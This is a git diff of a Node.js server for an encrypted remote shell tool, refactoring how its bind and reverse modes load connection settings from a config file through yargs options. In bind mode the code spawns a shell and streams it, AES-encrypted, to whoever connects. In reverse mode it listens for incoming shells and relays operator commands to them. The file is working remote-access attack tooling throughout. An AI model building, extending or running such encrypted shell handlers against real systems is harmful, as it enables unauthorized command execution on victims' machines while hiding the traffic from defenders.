@@ -2,15 +2,7 @@ const { createServer } = require("net")
 const { createInterface } = require("readline")
 const { spawn } = require("child_process")
 const { CryptorAES } = require('./crypt')
-const { listen_address, listen_port, aes_password, aes_iv } = require('./server_config.json')
-
-const crypt = new CryptorAES(aes_password, aes_iv)
-
-const config = {
-    host: listen_address,
-    port: listen_port,
-    exclusive: true
-}
+const yargs = require("yargs")
 
 //convert text to encrypted buffer
 function translate_out(cleartext){
@@ -26,7 +18,7 @@ function translate_in(encBuff){
 }
 
 // Bind listener
-function Bind(){
+function Bind(config){
     const server = createServer((socket) => {
 
         let shellcmd = undefined
@@ -43,7 +35,6 @@ function Bind(){
         }
     
         const shell = spawn(shellcmd)
-        console.log("INFO:client connected")
         socket.write(translate_out("INFO:Connected to remote host"))
     
         // shell stdout to client
@@ -74,14 +65,17 @@ function Bind(){
     })
     
     server.listen(config, () => {
-        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
+        console.log(`INFO:Listening on ${config.host}:${config.port}`);
     });
+
+    server.on("connection", () => {
+        console.log("INFO:client connected")
+    })
 }
 
 // Reverse listener
-function Reverse(){
+function Reverse(config){
     const server = createServer((socket) => {
-        console.log("INFO:client connected")
     
         const int = createInterface({
             input: process.stdin,
@@ -111,24 +105,54 @@ function Reverse(){
     })
     
     server.listen(config, () => {
-        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
+        console.log(`INFO:Listening on ${config.host}:${config.port}`);
     });
+
+    server.on("connection", () => {
+        console.log("INFO:client connected")
+    })
     
 }
 
-switch(process.argv[2]){
-    case "b":
-        Bind()
+const argv = yargs
+    .option('opmode', {
+        alias: 'o',
+        desc: 'Op mode. Accepted values "[b]ind or [r]everse mode. Defaults to bind.',
+        type: 'string',
+        default: 'b',
+        demandOption: true,
+        choices: ['b', 'r']
+    })
+    .option('configfile', {
+        alias: 'c',
+        desc: 'Config file for connection details',
+        type: 'string',
+        demandOption: true
+    })
+    .argv
+
+
+let connection_info
+let crypt
+
+if (argv.configfile !== undefined) {
+    const configfile = require(`./${argv.configfile}`)
+    crypt = new CryptorAES(configfile.aes_password, configfile.aes_iv)
+    connection_info = {
+        host: configfile.listen_address.toString(),
+        port: parseInt(configfile.listen_port),
+        exclusive: true
+    }
+}
+
+switch (argv.opmode) {
+    case 'b':
+        Bind(connection_info)
         break
-    case "r":
-        Reverse()
+    case 'r':
+        Reverse(connection_info)
         break
     default:
-        const helpText = "Op mode not defined!\n"
-        + "Usage:\n"
-        + "node server r (Reverse connection)\n"
-        + "node server b (Bind connection)"
-        
-        console.log(helpText)
+        console.log("ERROR")
         process.exit(1)
 }
